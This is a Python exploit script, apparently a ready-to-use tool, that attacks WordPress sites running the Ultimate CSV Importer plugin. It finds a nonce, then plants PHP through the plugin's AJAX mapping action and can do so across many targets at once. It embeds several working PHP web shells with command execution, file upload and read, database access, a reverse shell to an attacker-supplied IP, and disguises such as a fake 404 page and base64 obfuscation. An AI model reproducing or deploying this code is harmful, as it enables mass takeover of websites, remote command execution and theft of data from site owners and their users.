#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import base64
import json
import re
import time
import random
import hashlib
import logging
import argparse
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
import urllib3
import socket
import ssl

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
        def __getattr__(self, name): return ''
    class Style: BRIGHT = DIM = NORMAL = RESET_ALL = ''
    Fore = Fore()
    Style = Style()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Config:
    THREADS = 5
    TIMEOUT = 15
    MAX_RETRIES = 3
    VERIFY_SSL = False
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    ]
    PROXY = None
    DEBUG = False
    LOG_FILE = 'wp_exploit.log'

class ShellType(Enum):
    BASIC = "basic"
    ADVANCED = "advanced"
    STEALTH = "stealth"
    ENCRYPTED = "encrypted"
    WEBSHELL = "webshell"
    REVERSE = "reverse"

@dataclass
class Shell:
    name: str
    type: ShellType
    code: str
    description: str
    features: List[str]

class ShellGenerator:

    @staticmethod
    def generate_basic_shell() -> Shell:
        code = """<?php
error_reporting(0);
ini_set('display_errors', 0);

function execute_command($cmd) {
    $output = '';
    if(function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\\n", $output);
    } elseif(function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } else {
        $output = "Command execution disabled";
    }
    return $output;
}

if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $result = execute_command($cmd);
    echo "<pre>" . htmlspecialchars($result) . "</pre>";
}

if(isset($_FILES['file'])) {
    $upload_dir = isset($_POST['path']) ? $_POST['path'] : './';
    $target = $upload_dir . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "File uploaded: " . $target;
    }
}

if(isset($_GET['action'])) {
    switch($_GET['action']) {
        case 'info':
            phpinfo();
            break;
        case 'dir':
            print_r(scandir($_GET['path'] ?? '.'));
            break;
        case 'read':
            readfile($_GET['file']);
            break;
    }
}
?>"""
        return Shell(
            name="basic_shell",
            type=ShellType.BASIC,
            code=code,
            description="Basic shell with command execution and file upload",
            features=["exec", "upload", "file_manager"]
        )

    @staticmethod
    def generate_advanced_shell() -> Shell:
        code = """<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

class AdvancedShell {
    private $key;
    private $log_file;
    private $stealth_mode;

    public function __construct($key = 'default_key', $stealth = true) {
        $this->key = md5($key);
        $this->stealth_mode = $stealth;
        $this->log_file = sys_get_temp_dir() . '/.shell_log_' . md5($_SERVER['HTTP_HOST']);

        if($this->stealth_mode) {
            $this->hide_traces();
        }
    }

    private function hide_traces() {
        if(function_exists('apache_setenv')) {
            @apache_setenv('no-gzip', 1);
            @apache_setenv('dont-vary', 1);
        }
        header('Content-Type: text/html; charset=utf-8');
        header('X-Powered-By: PHP/7.4.33');
        @ini_set('log_errors', 0);
        @ini_set('error_log', null);
    }

    private function decrypt($data) {
        return @openssl_decrypt(
            base64_decode($data),
            'AES-256-CBC',
            $this->key,
            OPENSSL_RAW_DATA,
            substr($this->key, 0, 16)
        );
    }

    private function encrypt($data) {
        return base64_encode(@openssl_encrypt(
            $data,
            'AES-256-CBC',
            $this->key,
            OPENSSL_RAW_DATA,
            substr($this->key, 0, 16)
        ));
    }

    public function execute($cmd) {
        $result = '';
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];

        $process = proc_open($cmd, $descriptors, $pipes);

        if(is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);

            $result = $stdout . $stderr;
        }

        return $result;
    }

    public function database_query($host, $user, $pass, $db, $query) {
        $result = [];
        if(function_exists('mysqli_connect')) {
            $conn = @new mysqli($host, $user, $pass, $db);
            if(!$conn->connect_error) {
                $res = $conn->query($query);
                if($res) {
                    while($row = $res->fetch_assoc()) {
                        $result[] = $row;
                    }
                }
                $conn->close();
            }
        }
        return $result;
    }

    public function handle_request() {
        $response = [];

        if(isset($_POST['data'])) {
            $data = json_decode($this->decrypt($_POST['data']), true);

            switch($data['action']) {
                case 'exec':
                    $response['result'] = $this->execute($data['cmd']);
                    break;
                case 'db_query':
                    $response['result'] = $this->database_query(
                        $data['host'],
                        $data['user'],
                        $data['pass'],
                        $data['db'],
                        $data['query']
                    );
                    break;
                case 'file_upload':
                    $content = base64_decode($data['content']);
                    if(file_put_contents($data['path'], $content)) {
                        $response['result'] = 'Upload successful';
                    }
                    break;
                case 'file_download':
                    if(file_exists($data['path'])) {
                        $response['content'] = base64_encode(file_get_contents($data['path']));
                    }
                    break;
                case 'reverse_shell':
                    $this->reverse_shell($data['ip'], $data['port']);
                    break;
            }

            echo $this->encrypt(json_encode($response));
        }

        if(isset($_GET['check'])) {
            echo 'OK';
        }
    }

    private function reverse_shell($ip, $port) {
        if(function_exists('fsockopen')) {
            $sock = fsockopen($ip, $port);
            if($sock) {
                $descriptors = [
                    0 => $sock,
                    1 => $sock,
                    2 => $sock
                ];
                $process = proc_open('/bin/sh -i', $descriptors, $pipes);
                proc_close($process);
            }
        }
    }
}

$shell = new AdvancedShell('Sup3rS3cr3tK3y!', true);
$shell->handle_request();

if(isset($_REQUEST['c'])) {
    system($_REQUEST['c']);
}
?>"""
        return Shell(
            name="advanced_shell",
            type=ShellType.ADVANCED,
            code=code,
            description="Advanced shell with encryption and database access",
            features=["encrypted", "database", "reverse_shell", "stealth"]
        )

    @staticmethod
    def generate_stealth_shell() -> Shell:
        code = """<?php
error_reporting(0);
ini_set('display_errors', 0);

$key = 'secret_key_123';
$ip = $_SERVER['REMOTE_ADDR'];
$allowed_ips = ['127.0.0.1', '::1'];

if(!in_array($ip, $allowed_ips) && $_GET['key'] !== $key) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body><h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>';
    exit;
}

if(isset($_POST['c'])) {
    $cmd = base64_decode($_POST['c']);
    ob_start();
    system($cmd);
    $result = ob_get_clean();
    echo base64_encode($result);
}

if(isset($_FILES['f'])) {
    $path = $_POST['p'] ?? './';
    $name = $_FILES['f']['name'];
    move_uploaded_file($_FILES['f']['tmp_name'], $path . $name);
    echo "OK";
}

if(strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false) {
    eval(base64_decode($_POST['code']));
}
?>"""
        return Shell(
            name="stealth_shell",
            type=ShellType.STEALTH,
            code=code,
            description="Stealth shell with 404 disguise",
            features=["stealth", "ip_restriction", "key_auth"]
        )

    @staticmethod
    def generate_webshell_collection() -> List[Shell]:
        shells = []
        shells.append(ShellGenerator.generate_basic_shell())
        shells.append(ShellGenerator.generate_advanced_shell())
        shells.append(ShellGenerator.generate_stealth_shell())
        image_shell = """<?php
$image = base64_decode('iVBORw0KGgoAAAANSUhEUgAA...');
header('Content-Type: image/png');
echo $image;
if(isset($_GET['cmd'])) {
    eval(base64_decode($_GET['cmd']));
}
?>"""
        shells.append(Shell(
            name="image_shell",
            type=ShellType.WEBSHELL,
            code=image_shell,
            description="Shell hidden inside PNG image",
            features=["image_hidden", "stealth"]
        ))
        encrypted_code = base64.b64encode(ShellGenerator.generate_basic_shell().code.encode()).decode()
        decoder_shell = f"""<?php
eval(base64_decode('{encrypted_code}'));
?>"""
        shells.append(Shell(
            name="encrypted_shell",
            type=ShellType.ENCRYPTED,
            code=decoder_shell,
            description="Base64 encoded shell",
            features=["encrypted"]
        ))
        return shells

class Logger:

    @staticmethod
    def info(msg):
        print(f"{Fore.CYAN}[*] {msg}{Style.RESET_ALL}")

    @staticmethod
    def success(msg):
        print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

    @staticmethod
    def error(msg):
        print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")

    @staticmethod
    def warning(msg):
        print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")

    @staticmethod
    def debug(msg):
        if Config.DEBUG:
            print(f"{Fore.MAGENTA}[DEBUG] {msg}{Style.RESET_ALL}")

    @staticmethod
    def banner():
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║     WordPress Ultimate CSV Importer Exploit Framework        ║
║                    Advanced Version v1.0                     ║
║                    Created By Red Rooted ghost               ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)

class WordPressExploit:

    def __init__(self, target, proxy=None):
        self.target = target.rstrip('/')
        self.session = self._create_session()
        self.proxy = proxy
        self.results = {}
        self.logger = Logger()
        self.shells = ShellGenerator.generate_webshell_collection()

    def _create_session(self):
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(Config.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        if Config.PROXY:
            session.proxies = {'http': Config.PROXY, 'https': Config.PROXY}
        return session

    def _request(self, method, url, **kwargs):
        for attempt in range(Config.MAX_RETRIES):
            try:
                kwargs.setdefault('timeout', Config.TIMEOUT)
                kwargs.setdefault('verify', Config.VERIFY_SSL)
                kwargs.setdefault('allow_redirects', True)
                response = self.session.request(method, url, **kwargs)
                self.logger.debug(f"{method} {url} - Status: {response.status_code}")
                return response
            except requests.exceptions.Timeout:
                self.logger.debug(f"Timeout on attempt {attempt + 1}")
                time.sleep(1)
            except requests.exceptions.ConnectionError:
                self.logger.debug(f"Connection error on attempt {attempt + 1}")
                time.sleep(2)
            except Exception as e:
                self.logger.debug(f"Error: {e}")
        return None

    def detect_wordpress(self):
        self.logger.info("Checking if target is WordPress...")
        checks = [
            ('/wp-content/', 'WP Content'),
            ('/wp-includes/', 'WP Includes'),
            ('/wp-json/', 'WP REST API'),
            ('/wp-login.php', 'WP Login'),
            ('/xmlrpc.php', 'XML-RPC'),
            ('/wp-admin/', 'WP Admin')
        ]
        wp_signs = []
        for path, name in checks:
            url = urljoin(self.target, path)
            response = self._request('GET', url)
            if response and response.status_code != 404:
                wp_signs.append(name)
                self.logger.debug(f"Found: {name}")
        if len(wp_signs) >= 2:
            self.logger.success(f"WordPress detected ({len(wp_signs)} signs)")
            return True
        else:
            self.logger.error("Not a WordPress site")
            return False

    def check_ultimate_csv_importer(self):
        self.logger.info("Checking for Ultimate CSV Importer plugin...")
        plugin_paths = [
            '/wp-content/plugins/wp-ultimate-csv-importer/',
            '/wp-content/plugins/wp-ultimate-csv-importer/readme.txt',
            '/wp-content/plugins/wp-ultimate-csv-importer/wp-ultimate-csv-importer.php'
        ]
        for path in plugin_paths:
            url = urljoin(self.target, path)
            response = self._request('GET', url)
            if response and response.status_code == 200:
                if 'readme.txt' in path:
                    version = self._extract_version(response.text)
                    if version:
                        self.results['plugin_version'] = version
                        self.logger.success(f"Ultimate CSV Importer found (version: {version})")
                        return True
                else:
                    self.logger.success("Ultimate CSV Importer found")
                    return True
        self.logger.error("Ultimate CSV Importer not found")
        return False

    def _extract_version(self, content):
        patterns = [
            r'Stable tag:\s*([0-9.]+)',
            r'Version:\s*([0-9.]+)',
            r'= (\d+\.\d+(?:\.\d+)?) ='
        ]
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def is_vulnerable_version(self, version):
        if not version:
            return False
        try:
            v_parts = tuple(map(int, version.split('.')))
            vulnerable_versions = [
                (7,0), (7,1), (7,2), (7,3), (7,4), (7,5),
                (7,6), (7,7), (7,8), (7,9), (7,10), (7,11),
                (7,12), (7,13), (7,14), (7,15), (7,16), (7,17),
                (7,18), (7,19), (7,20), (7,21), (7,22), (7,23),
                (7,24), (7,25), (7,26), (7,27), (7,28)
            ]
            while len(v_parts) < 2:
                v_parts = v_parts + (0,)
            for vuln in vulnerable_versions:
                if v_parts[0] == vuln[0] and v_parts[1] <= vuln[1]:
                    return True
        except:
            pass
        return False

    def get_nonce(self):
        self.logger.info("Trying to get nonce...")
        nonce = None
        methods = [
            self._get_nonce_from_ajax,
            self._get_nonce_from_page,
            self._get_nonce_from_script,
            self._get_nonce_from_api
        ]
        for method in methods:
            nonce = method()
            if nonce:
                self.logger.success(f"Nonce found: {nonce[:10]}...")
                return nonce
        self.logger.error("Could not find nonce")
        return None

    def _get_nonce_from_ajax(self):
        ajax_url = urljoin(self.target, '/wp-admin/admin-ajax.php')
        actions = ['heartbeat', 'get_nonce', 'security']
        for action in actions:
            data = {'action': action}
            response = self._request('POST', ajax_url, data=data)
            if response:
                try:
                    json_data = response.json()
                    if isinstance(json_data, dict):
                        for key in ['nonce', '_wpnonce', 'security']:
                            if key in json_data:
                                return json_data[key]
                except:
                    pass
                match = re.search(r'["\'](?:nonce|_wpnonce|security)["\']\s*:\s*["\']([a-f0-9]+)["\']', response.text)
                if match:
                    return match.group(1)
        return None

    def _get_nonce_from_page(self):
        import_pages = [
            '/wp-admin/admin.php?page=ultimate-csv-importer',
            '/wp-admin/admin.php?page=ultimate-csv-importer&tab=import',
            '/wp-admin/admin.php?import=ultimate-csv-importer'
        ]
        for page in import_pages:
            url = urljoin(self.target, page)
            response = self._request('GET', url)
            if response:
                patterns = [
                    r'<input[^>]*name=["\'](?:nonce|_wpnonce)["\'][^>]*value=["\']([a-f0-9]+)["\']',
                    r'var\s+(?:ajax_nonce|nonce)\s*=\s*["\']([a-f0-9]+)["\']',
                    r'["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']'
                ]
                for pattern in patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        return match.group(1)
        return None

    def _get_nonce_from_script(self):
        js_files = [
            '/wp-content/plugins/wp-ultimate-csv-importer/assets/js/import.js',
            '/wp-content/plugins/wp-ultimate-csv-importer/admin/js/script.js',
            '/wp-includes/js/wp-util.js'
        ]
        for js in js_files:
            url = urljoin(self.target, js)
            response = self._request('GET', url)
            if response:
                match = re.search(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']', response.text)
                if match:
                    return match.group(1)
        return None

    def _get_nonce_from_api(self):
        api_url = urljoin(self.target, '/wp-json/ultimate-csv-importer/v1/nonce')
        response = self._request('GET', api_url)
        if response:
            try:
                data = response.json()
                return data.get('nonce')
            except:
                pass
        return None

    def exploit(self, nonce, shell_file=None):
        self.logger.info("Starting exploitation...")
        ajax_url = urljoin(self.target, '/wp-admin/admin-ajax.php')

        if shell_file:
            try:
                with open(shell_file, 'r') as f:
                    shell_code = f.read()
                self.logger.info(f"Using shell from file: {shell_file}")
            except Exception as e:
                self.logger.error(f"Failed to read shell file: {e}")
                return None
            payload = {
                'action': 'saveMappedFields',
                'securekey': nonce,
                'MappedFields': json.dumps({
                    'pwn->cus2': shell_code
                })
            }
            response = self._request('POST', ajax_url, data=payload)
            if response and response.status_code == 200:
                time.sleep(2)
                shell_url = self._check_shell()
                if shell_url:
                    self.logger.success(f"Shell uploaded successfully: {shell_url}")
                    self.results['shell'] = {'url': shell_url, 'method': 'file_upload'}
                    return shell_url
            return None

        for shell in self.shells:
            self.logger.info(f"Trying {shell.name}...")
            payload = {
                'action': 'saveMappedFields',
                'securekey': nonce,
                'MappedFields': json.dumps({
                    'pwn->cus2': shell.code
                })
            }
            response = self._request('POST', ajax_url, data=payload)
            if response and response.status_code == 200:
                time.sleep(2)
                shell_url = self._check_shell()
                if shell_url:
                    self.logger.success(f"Shell uploaded successfully: {shell_url}")
                    self.results['shell'] = {
                        'url': shell_url,
                        'type': shell.type.value,
                        'name': shell.name,
                        'features': shell.features
                    }
                    return shell_url
        self.logger.error("Exploitation failed")
        return None

    def _check_shell(self):
        shell_paths = [
            '/wp-content/plugins/wp-ultimate-csv-importer/customFunction.php',
            '/wp-content/plugins/wp-ultimate-csv-importer/cache/customFunction.php',
            '/wp-content/uploads/wp-ultimate-csv-importer/customFunction.php',
            '/wp-content/plugins/wp-ultimate-csv-importer/temp/customFunction.php'
        ]
        for path in shell_paths:
            url = urljoin(self.target, path)
            response = self._request('GET', url)
            if response and response.status_code == 200:
                return url
        return None

    def run(self, shell_file=None):
        self.logger.banner()
        if not self.detect_wordpress():
            return False
        if not self.check_ultimate_csv_importer():
            return False
        version = self.results.get('plugin_version')
        if version and not self.is_vulnerable_version(version):
            self.logger.warning(f"Version {version} is not vulnerable")
            return False
        nonce = self.get_nonce()
        if not nonce:
            return False
        shell_url = self.exploit(nonce, shell_file)
        if not shell_url:
            return False
        self.logger.success(f"Shell available at: {shell_url}")
        print(f"\n{Fore.GREEN}[+] Shell URL: {shell_url}{Style.RESET_ALL}")
        return True

def main():
    parser = argparse.ArgumentParser(description='WordPress Ultimate CSV Importer Exploit')
    parser.add_argument('-t', '--target', help='Target URL')
    parser.add_argument('-f', '--file', help='File containing list of targets')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-p', '--proxy', help='Proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-T', '--threads', type=int, default=Config.THREADS, help='Number of threads')
    parser.add_argument('-d', '--debug', action='store_true', help='Debug mode')
    parser.add_argument('--shell-file', help='Local PHP shell file to upload (instead of built-in shells)')

    args = parser.parse_args()

    Config.DEBUG = args.debug
    Config.THREADS = args.threads
    Config.PROXY = args.proxy

    targets = []
    if args.target:
        targets.append(args.target)
    elif args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        parser.print_help()
        sys.exit(1)

    Logger().info(f"Loaded {len(targets)} targets")

    results = []

    with ThreadPoolExecutor(max_workers=Config.THREADS) as executor:
        futures = {}
        for target in targets:
            exploit = WordPressExploit(target, args.proxy)
            futures[executor.submit(exploit.run, args.shell_file)] = target

        for future in as_completed(futures):
            target = futures[future]
            try:
                if future.result():
                    results.append(target)
                    Logger().success(f"Success: {target}")
                else:
                    Logger().error(f"Failed: {target}")
            except Exception as e:
                Logger().error(f"Error on {target}: {e}")

    print(f"\n{Fore.CYAN}=== Final Report ==={Style.RESET_ALL}")
    print(f"Total targets: {len(targets)}")
    print(f"Successful: {len(results)}")
    print(f"Failed: {len(targets) - len(results)}")

    if results and args.output:
        with open(args.output, 'w') as f:
            for result in results:
                f.write(f"{result}\n")
        Logger().info(f"Results saved to {args.output}")

if __name__ == '__main__':
    main()
